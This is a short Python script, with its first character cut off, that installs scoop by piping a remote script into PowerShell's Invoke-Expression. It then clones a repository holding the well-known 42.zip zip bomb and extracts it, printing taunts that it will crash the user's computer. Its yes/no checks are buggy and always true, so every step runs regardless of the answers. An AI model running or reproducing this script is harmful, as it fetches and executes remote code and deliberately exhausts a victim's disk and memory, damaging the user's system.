mport time
import os

askscoop = input("Yo, do you have scoop installed? (Y/N)")
print("")
askgit = input("Yo, do you have Git installed? (Y/N)")
print("")
askzip = input("Yo, do you have Zip installed? (Y/N)")
print("")
# os.system("echo hello, world!")

if askscoop == "N" or "n":
    os.system('powershell -Command "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"') 
    os.system('powershell -Command "Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression"')

if askgit == "N" or "n":
    os.system("scoop install git")

if askzip == "N" or "n":
    os.system("scoop install zip unzip")


print("Ok now I'm gonna install the zip bomb...")

os.system("git clone https://github.com/iamtraction/ZOD.git")

print("Yeah brother this is gonna crash your system...")

time.sleep(1)
print(".", end=" ")
time.sleep(1)
print(".", end=" ")
time.sleep(1)
print(".", end=" ")

print("Ok brother say bye to your computer...")
os.system("unzip -o -P 42 42.zip")

